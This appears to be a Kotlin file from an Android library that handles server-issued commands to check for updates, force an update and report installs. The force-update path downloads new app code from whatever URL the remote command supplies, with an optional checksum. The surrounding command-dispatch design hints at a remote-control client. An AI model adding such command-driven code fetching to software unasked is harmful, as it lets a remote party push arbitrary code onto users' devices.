package com.hawkshaw.library.features.update

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.Command
// ServiceFactory and AppService (interface) are not directly used for ApiService (class) instantiation here
import com.hawkshaw.library.network.ApiService // Ensure this is the class: com.hawkshaw.library.network.ApiService
import com.hawkshaw.library.datalayer.network.reportAppInstall 
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.UUID

object AppUpdateCommandHandler {
    
    private const val TAG = "AppUpdateCommandHandler"
    
    @RequiresApi(Build.VERSION_CODES.O)
    fun handleUpdateCommand(command: Command, context: Context) {
        Log.d(TAG, "Handling update command: ${command.type}")
        
        when (command.type) {
            Command.CommandType.CheckAppUpdate -> {
                handleCheckAppUpdate(context)
            }
            Command.CommandType.ForceAppUpdate -> {
                handleForceAppUpdate(command, context)
            }
            Command.CommandType.ReportAppInstall -> {
                handleReportAppInstall(command, context)
            }
            else -> {
                Log.w(TAG, "Unhandled update command type: ${command.type}")
            }
        }
    }
    
    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleCheckAppUpdate(context: Context) {
        Log.d(TAG, "Starting app update check")
        AppUpdateService.startUpdateCheck(context)
    }
    
    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleForceAppUpdate(command: Command, context: Context) {
        try {
            val jsonString = command.text ?: run {
                Log.e(TAG, "Force update request data is null")
                return
            }
            
            val json = org.json.JSONObject(jsonString)
            val versionName = json.optString("version_name", "")
            val versionCode = json.optInt("version_code", 0)
            val downloadUrl = json.optString("download_url", "")
            val fileSize = json.optLong("file_size", 0L)
            val checksum = json.optString("checksum", "")
            val isMandatory = json.optBoolean("is_mandatory", false)
            
            if (downloadUrl.isEmpty() || versionName.isEmpty() || versionCode == 0) {
                Log.e(TAG, "Invalid force update command data")
                return
            }
            
            Logger.i(TAG, "Force updating to version $versionName")
            
            AppUpdateService.startUpdateDownload(
                context = context,
                updateUrl = downloadUrl,
                versionName = versionName,
                versionCode = versionCode,
                fileSize = fileSize,
                checksum = checksum,
                isMandatory = isMandatory
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling force app update command", e)
        }
    }
    
    // Corrected to directly instantiate com.hawkshaw.library.network.ApiService class
    private fun getApiService(context: Context): ApiService? {
        return try {
            ApiService(context)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create ApiService instance", e)
            null
        }
    }

    private fun handleReportAppInstall(command: Command, context: Context) {
        try {
            val jsonString = command.text ?: run {
                Log.e(TAG, "Report install request data is null")
                return
            }
            
            val json = org.json.JSONObject(jsonString)
            val versionCode = json.optInt("version_code", 0)
            val success = json.optBoolean("success", false)
            val errorMessage = json.optString("error_message", null)
            val deviceId = getDeviceId(context)

            if (deviceId.isEmpty()) { 
                Log.e(TAG, "Device ID is empty, cannot report app installation")
                return
            }
            
            Log.d(TAG, "Reporting app install: version=$versionCode, success=$success, deviceId=$deviceId")
            
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    // getApiService now returns the correct ApiService class instance
                    val apiService = getApiService(context)
                    if (apiService != null) {
                        // reportAppInstall is an extension function on com.hawkshaw.library.network.ApiService
                        val result = apiService.reportAppInstall(
                            deviceId = deviceId,
                            versionCode = versionCode,
                            success = success,
                            errorMessage = errorMessage
                        )
                        
                        if (result) {
                            Log.i(TAG, "Successfully reported app installation for version $versionCode")
                        } else {
                            Log.e(TAG, "Failed to report app installation for version $versionCode")
                        }
                    } else {
                        Log.e(TAG, "ApiService is null, cannot report app installation for version $versionCode")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error reporting app installation for version $versionCode", e)
                }
            }
        } catch (e: org.json.JSONException) {
            Log.e(TAG, "Error parsing JSON for report app install command", e)
        } 
        catch (e: Exception) {
            Log.e(TAG, "Error handling report app install command", e)
        }
    }
    
    private fun getDeviceId(context: Context): String {
        val prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", deviceId).apply()
        }
        return deviceId
    }
}
